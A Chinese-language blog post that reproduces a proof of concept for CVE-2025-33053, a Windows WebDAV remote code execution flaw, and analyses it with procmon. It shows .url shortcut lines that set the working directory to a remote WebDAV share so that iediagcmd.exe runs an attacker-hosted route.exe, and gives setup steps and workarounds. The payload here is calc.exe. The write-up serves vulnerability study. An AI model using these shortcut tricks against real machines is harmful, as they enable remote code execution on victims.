#  CVE-2025-33053 Poc复现研究细节  
原创 MicroPest  MicroPest   2025-06-28 15:06  
  
今天看到这个CVE Poc，来了兴趣，进行了复现，但并不顺利。开始时死活不弹出计算器测试程序，这个过程持续了一下午+一晚上，终在晚上9时，捣鼓出来了，花了2个小时截图、写文章。我觉得网上那些人，咋做得那么顺利呢？曲折有曲折的好处，通过这些过程，让我对其中的细节理解地更深体会更深。  
  
就这样吧，脖子受不了了。  
  
2025 年 6 月的 Windows 更新修复了CVE-2025-33053漏洞，这是一个远程代码执行漏洞，目前已发现有人在野外利用。该漏洞允许指向合法本地 Windows 可执行文件的恶意 URL 文件在打开时从攻击者位于互联网上的服务器“侧载”DLL 或 EXE 文件。注意的是，虽然微软将此漏洞命名为“WEBDAV RCE远程代码执行”，但该漏洞通常可以通过任何 SMB 网络共享（包括内部网络共享文件夹）进行利用。然而，由于大多数防火墙和互联网服务提供商会阻止 SMB 流量，因此WebDAV 的攻击场景更加强大，因为它允许恶意 DLL 直接穿过防火墙从互联网上的服务器加载。  
  
**这个漏洞有点象当年的DLL劫持一样，利用了windows搜索顺序逻辑。**  
  
****  
攻击者使用指向 WebDAV 服务器的.url恶意快捷方式。当 Windows 执行合法工具（例如IE/Edge）时，它会默认进入远程文件夹并运行攻击者控制的二进制文件（例如），而不是本地文件。  
  
  
Poc地址：  
https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept  
  
使用过程，见网上很多文章，介绍下我的研究细节，  
  
1、执行 ./setup_webdav.sh，搭建webdav服务器，如下图部署成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn8ffIMibq5yLZVI08ebMkpFzRmmrGtP6KP0vQ2y5avgNFKfn73sibT7rTQ/640?wx_fmt=png&from=appmsg "")  
  
将calc.exe copy到/var/www/webdav目录下改名为route.exe，以及  
C:\Program Files\Internet Explorer\iediagcmd.exe也copy到同目录下。  
  
访问   
http://192.168.239.128/webdav，如下图表示成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn8zUYcg1LOLa4HKDG8NC2dR84e0Sibzw6eA4Kub2Eaib8IoQu6Ax1nSzyw/640?wx_fmt=png&from=appmsg "")  
  
2、生成url文件，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn8So8Q4xiazVPoKopiceZbh4k1IJicJENTrSpfAJRCgWKJTAGd0s411s7tw/640?wx_fmt=png&from=appmsg "")  
  
说下上图中url的执行顺序，  
  
先执行  
URL=C:\Program Files\Internet Explorer\iediagcmd.exe，当它运行时会收集一些信息，这是正常的功能，其中包含了一项功能就是route，所以它会调用route.exe，这时顺序来了，从哪找起呢，注意url的第二行  
WorkingDirectory=\\192.168.239.128\webdav\  
，会从webdav服务器上找route这个程序，所以会执行route.exe这个程序，而route.exe是计算器，因此弹出了calc。如果这是个木马，就隐蔽地执行了。  
  
3、将这个生成的doc.url放到windows本机上，双击，发现并没有弹出名为route.exe的计算器calc程序（后面又弹出了，刚开始时始终不行。下面的截图都是成功弹出）；  
  
一、成功状况下地分析  
  
4、架起procmon、procexp进行分析  
  
监视iediagcmd.exe以及route.exe程序的运行状态  
  
当我截上面这张图时，弹出了计算器，发现是执行成功了，刚才死活不行的。  
  
（4-1）我们来看下iediagcmd.exe的执行顺序，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn88RzhBEG9Mn5MicOITGxsBBu3wWH4VOcteo8BmgtQrK08GKpibZj5P1xg/640?wx_fmt=png&from=appmsg "")  
  
找ipconfig，先在当前目录和webdav下找，没找到，转去system32下。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn8iac8v50GeN9MgkeQhAHI7H3KCNxEFGGlWEf0mkAhTZnaAw3ys0wm0yQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn8EzoXCnL2yfEewOw03Afm3xeRzpWvwHSEEpjPKRjQlgAfnpMYhQxRkA/640?wx_fmt=png&from=appmsg "")  
  
接着找route，当前目录下没有，就去webdav下找，发现了，执行它。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn8Ykry790DlhAOicoU5O1tDe4DQ4BPJ95NQe0KL5UHHSvxngZE4TeyBgA/640?wx_fmt=png&from=appmsg "")  
  
接着找mpr.dll；  
  
不往下截图了。顺着找，可以将iediagcmd所有调用的收集程序全部找出来，也就意味着webdav服务器可以存放这些“冒名”的程序供它下载执行。  
  
（4-2）看下procexp，  
iediagcmd调用了route.exe，如下图。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpLOfN4MsS96Y4nOraMJEtn847wTZicdeJUxf3sWPFAmlzIBVBibK1S86LKJSoSUpDFIWPLYuwLVfiaQA/640?wx_fmt=png&from=appmsg "")  
  
  
====  
  
二、不成功状态下的方法  
  
我接着来说前面没执行成功时的做法：  
  
方法1：  
  
将url第一行   
URL=C:\Program Files\Internet Explorer\iediagcmd.exe  
  
改成：  
  
URL=\\192.168.239.128\webdav\route.exe  
  
让它直接执行，这法子果然可行；  
  
方法2：powershell下执行  
  
net use z: \\192.168.239.128\webdav  
  
dir z:  
  
直接打开共享；后面我关闭了net use z: /delete。  
  
通过上面两种方法，现在改回   
URL=C:\Program Files\Internet Explorer\iediagcmd.exe，发现可以弹出route.exe计算器了。  
  
  
=====  
  
《[CVE-2025-33053，Stealth Falcon 和 Horus：中东网络间谍活动传奇](https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531295&idx=2&sn=1bf7b0c5827626d1954d97ddab0be670&scene=21#wechat_redirect)  
》对整个攻击链的分析，值得一看。  
  
  
###   
  
  
